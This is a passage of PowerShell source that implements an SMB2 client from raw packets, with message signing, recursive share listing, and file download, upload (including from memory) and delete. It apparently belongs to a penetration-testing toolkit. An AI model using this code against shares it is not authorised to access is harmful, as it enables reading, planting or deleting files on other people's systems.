                            $SMB_filename_length = [System.BitConverter]::ToUInt32($SMB_client_receive[($create_response_file_index / 2 + 60 + $SMB_offset)..($create_response_file_index / 2 + 63 + $SMB_offset)],0)
                            $SMB_filename_unicode = $SMB_client_receive[($create_response_file_index / 2 + 104 + $SMB_offset)..($create_response_file_index / 2 + 104 + $SMB_offset + $SMB_filename_length - 1)]
                            $SMB_filename = [System.BitConverter]::ToString($SMB_filename_unicode)
                            $SMB_filename = $SMB_filename -replace "-00",""

                            if($SMB_filename.Length -gt 2)
                            {
                                $SMB_filename = $SMB_filename.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $SMB_filename_extract = New-Object System.String ($SMB_filename,0,$SMB_filename.Length)
                            }
                            else
                            {
                                $SMB_filename_extract = [String][Char][System.Convert]::ToInt16($SMB_filename,16)
                            }

                            if(!$Modify)
                            {
                                $file_last_write_time = $file_last_write_time.PadLeft(19,0)
                                [String]$SMB_file_length = $SMB_file_length
                                $SMB_file_length = $SMB_file_length.PadLeft(15,0)
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {

                                if($SMB_filename_extract -ne '.' -and $SMB_filename_extract -ne '..')
                                {
                                    $subdirectory_list.Add($SMB_filename_unicode) > $null
                                    $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                    $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                    $directory_contents_length_list.Add($SMB_file_length) > $null
                                    $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                    $directory_contents_create_time_list.Add($file_create_time) > $null
                                }

                            }
                            else
                            {
                                $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                $directory_contents_length_list.Add($SMB_file_length) > $null
                                $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                $directory_contents_create_time_list.Add($file_create_time) > $null
                            }

                            if($share_subdirectory -and !$share_subdirectory_start)
                            {
                                $root_directory_string = $share_subdirectory + '\'
                            }

                            $SMB_offset += $SMB_next_offset
                        }
                        until($SMB_next_offset -eq 0)

                        if($directory_contents_name_list)
                        {

                            if($root_directory_string)
                            {
                                $file_directory = $target_share + "\" + $root_directory_string.Substring(0,$root_directory_string.Length - 1)
                            }
                            else
                            {
                                $file_directory = $target_share
                            }

                        }

                        $directory_contents_output = @()
                        $i = 0

                        ForEach($directory in $directory_contents_name_list)
                        {
                            $directory_object = New-Object PSObject
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Name -Value ($file_directory + "\" + $directory_contents_name_list[$i])
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Mode -Value $directory_contents_mode_list[$i]
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Length -Value $directory_contents_length_list[$i]

                            if($Modify)
                            {
                                Add-Member -InputObject $directory_object -MemberType NoteProperty -Name CreateTime -Value $directory_contents_create_time_list[$i]
                            }

                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name LastWriteTime -Value $directory_contents_last_write_time_list[$i]
                            $directory_contents_output += $directory_object
                            $i++
                        }

                        if($directory_contents_output -and !$Modify)
                        {

                            if($directory_contents_hide_headers)
                            {
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                           @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                           @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                           @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -HideTableHeaders -Wrap| Out-String).Trim()
                            }
                            else
                            {
                                $directory_contents_hide_headers = $true
                                ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                           @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                           @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                           @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -Wrap| Out-String).Trim()
                            }

                        }
                        else
                        {
                            $directory_contents_output
                        }

                        $subdirectory_list.Reverse() > $null

                        ForEach($subdirectory in $subdirectory_list)
                        {  
                            $directory_list.Insert(0,($root_directory + $subdirectory)) > $null
                        }
                        
                        $SMB_offset = 0
                        $SMB_client_stage = 'CloseRequest'
                    }
                
                    'FindRequest'
                    {
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes
                        $packet_SMB2_header["SMB2Header_NextCommand"] = 0x68,0x00,0x00,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2FindRequestFile $SMB_file_ID 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB2_message_ID++
                        $packet_SMB2b_header = Get-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2b_header["SMB2Header_ProcessID"] = $process_ID_bytes

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["SMB2Header_Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["SMB2Header_Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = Get-PacketSMB2FindRequestFile $SMB_file_ID
                        $packet_SMB2b_data["SMB2FindRequestFile_OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 1)
                        {
                            $find_response = [System.BitConverter]::ToString($SMB_client_receive)
                            $find_response = $find_response -replace "-",""
                            $file_unicode = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes($source_file))
                            $file_unicode = $file_unicode -replace "-",""
                            $file_size_index = $find_response.IndexOf($file_unicode) - 128
                            $file_size = [System.BitConverter]::ToUInt32($SMB_client_receive[($file_size_index / 2)..($file_size_index / 2 + 7)],0)
                            $action_step++
                            $create_request_extra_info = 1
                            $SMB_client_stage = 'CreateRequest'

                            if($share_subdirectory -eq $file)
                            {
                                $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($file)
                            }
                            else
                            {
                                $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            }

                        }
                        else
                        {
                            $SMB_client_stage = 'ParseDirectoryContents'
                        }

                    }
                    
                    'CloseRequest'
                    {

                        if(!$SMB_file_ID)
                        {
                            $SMB_file_ID = $SMB_client_receive[132..147]
                        }

                        $SMB2_message_ID ++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
      
                        $packet_SMB2_data = Get-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_file_ID = ''

                        if($directory_list.Count -gt 0 -and $Action -eq 'Recurse')
                        {
                            $SMB2_file = $directory_list[0]
                            $root_directory = $SMB2_file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $SMB_client_stage = 'CreateRequest'

                            if($root_directory.Count -gt 2)
                            {
                                $root_directory_extract = [System.BitConverter]::ToString($root_directory)
                                $root_directory_extract = $root_directory_extract -replace "-00",""

                                if($root_directory.Length -gt 2)
                                {
                                    $root_directory_extract = $root_directory_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $root_directory_string = New-Object System.String ($root_directory_extract,0,$root_directory_extract.Length)
                                }
                                else
                                {
                                    $root_directory_string = [Char][System.Convert]::ToInt16($SMB2_file,16)
                                }

                            }

                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 1)
                        {

                            if($share_subdirectory -eq $source_file)
                            {
                                $SMB2_file = ""
                            }
                            else
                            {
                                $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                            }

                            $create_request_extra_info = 1
                            $SMB_client_stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            
                            switch($action_step)
                            {

                                0
                                {

                                    if($share_subdirectory -eq $source_file)
                                    {
                                        $SMB2_file = ""
                                    }
                                    else
                                    {
                                        $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                                    }

                                    $create_request_extra_info = 1
                                    $SMB_client_stage = 'CreateRequest'
                                    $action_step++

                                }

                                1
                                {
                                    $SMB_client_stage = 'CreateRequestFindRequest'
                                }

                                3
                                {
                                    $SMB_client_stage = 'TreeDisconnect'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $share_subdirectory_start = $false
                            $SMB_client_stage = 'CreateRequestFindRequest'
                        }
                        else
                        {
                            $SMB_client_stage = 'TreeDisconnect'
                        }

                    }

                    'ReadRequest'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditCharge"] = 0x01,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2ReadRequest $read_request_length $read_request_offset $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        Start-Sleep -m 5

                        if($read_request_length -eq 65536)
                        {
                            $i = 0

                            while($SMB_client.Available -lt 8192 -and $i -lt 10)
                            {
                                Start-Sleep -m $Sleep
                                $i++
                            }

                        }
                        else
                        {
                            Start-Sleep -m $Sleep
                        }
                        
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 3)
                        {
                            $action_step++
                            $create_request_extra_info = 1
                            $SMB_client_stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 7)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($read_request_step / $percent_complete * 100)
                                Write-Progress -Activity "Downloading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $file_bytes = $SMB_client_receive[84..($read_request_length + 83)]
                            
                            if(!$Modify)
                            {

                                if(!$file_write)
                                {
                                    $file_write = New-Object 'System.IO.FileStream' $destination_path,'Append','Write','Read'
                                }

                                $file_write.Write($file_bytes,0,$file_bytes.Count)
                            }
                            else
                            {
                                $file_memory+=$file_bytes
                            }

                            if($read_request_step -lt $file_stream_size_quotient)
                            {
                                $read_request_offset+=65536
                                $read_request_step++
                                $SMB_client_stage = 'ReadRequest'
                            }
                            elseif($read_request_step -eq $file_stream_size_quotient -and $file_stream_size_remainder -ne 0)
                            {
                                $read_request_length = $file_stream_size_remainder
                                $read_request_offset+=65536
                                $read_request_step++
                                $SMB_client_stage = 'ReadRequest'
                            }
                            else
                            {

                                if(!$Modify)
                                {
                                    Write-Output "File downloaded"
                                    $file_write.Close()
                                }
                                else
                                {
                                    Write-Verbose "File downloaded"
                                    $file_memory
                                }

                                $SMB_client_stage = 'CloseRequest'
                            }
                            
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = 'CloseRequest'
                        }
                        else
                        {
                            $SMB_client_stage = 'CloseRequest'
                        }

                    }

                    'WriteRequest'
                    {

                        if(!$Modify)
                        {
                            $source_file_binary_reader.BaseStream.Seek($write_request_offset,"Begin") > $null
                            $source_file_binary_reader.Read($source_file_buffer,0,$source_file_buffer_size) > $null
                        }
                        else
                        {
                            $source_file_buffer = $Source[$write_request_offset..($write_request_offset+$write_request_length)]
                        }

                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditCharge"] = 0x01,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
                        
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $write_request_length $write_request_offset $SMB_file_ID $source_file_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($write_request_step -lt $source_file_size_quotient)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($write_request_step / $percent_complete * 100)
                                Write-Progress -Activity "Uploading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $write_request_offset+=65536
                            $write_request_step++
                            $SMB_client_stage = 'WriteRequest'
                        }
                        elseif($write_request_step -eq $source_file_size_quotient -and $source_file_size_remainder -ne 0)
                        {
                            $write_request_length = $source_file_size_remainder
                            $write_request_offset+=65536
                            $write_request_step++
                            $SMB_client_stage = 'WriteRequest'
                        }
                        else
                        {
                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x04
                            $set_info_request_buffer = $source_file_creation_time +
                                                        $source_file_last_access_time +
                                                        $source_file_last_write_time +
                                                        $source_file_last_change_time + 
                                                        0x00,0x00,0x00,0x00,
                                                        0x00,0x00,0x00,0x00

                            if(!$Modify)
                            {
                                $SMB_client_stage = 'SetInfoRequest'
                            }
                            else
                            {
                                Write-Output "File uploaded from memory"
                                $SMB_client_stage = 'CloseRequest'
                            }

                        }

                    }

                    'TreeDisconnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x04,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
          
                        $packet_SMB2_data = Get-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Logoff'
                    }

                    'Logoff'
                    {
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = Get-PacketSMB2Header 0x02,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
         
                        $packet_SMB2_data = Get-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
            
            }

        }

    }

    }
    finally
    {  

        if($file_write.Handle)
        {
            $file_write.Close()
        }

        if($source_file_stream.Handle)
        {
            $source_file_binary_reader.Close()
            $source_file_stream.Close()
        }

        $SMB_client.Close()
        $SMB_client_stream.Close()
    }

}

}